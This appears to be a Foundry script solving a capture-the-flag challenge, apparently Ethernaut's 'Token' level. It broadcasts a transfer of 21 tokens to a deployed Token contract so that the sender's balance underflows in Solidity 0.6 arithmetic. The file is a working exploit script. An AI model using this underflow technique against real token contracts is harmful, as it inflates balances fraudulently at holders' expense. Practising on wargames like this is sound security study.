pragma solidity ^0.6.0;

import "../src/level5.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";



contract Solution is Script {
    Token public ins = Token(0x060550B8CE3bB41B3c19c04C0639190389843eEA);
    // SPDX-License-Identifier: MIT
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address to = address(0x060550B8CE3bB41B3c19c04C0639190389843eEA);
        console.log(vm.envAddress("MY_ADDRESS"));
        ins.transfer(to, 21);
        ins.balanceOf(vm.envAddress("MY_ADDRESS"));
        vm.stopBroadcast();
    }
}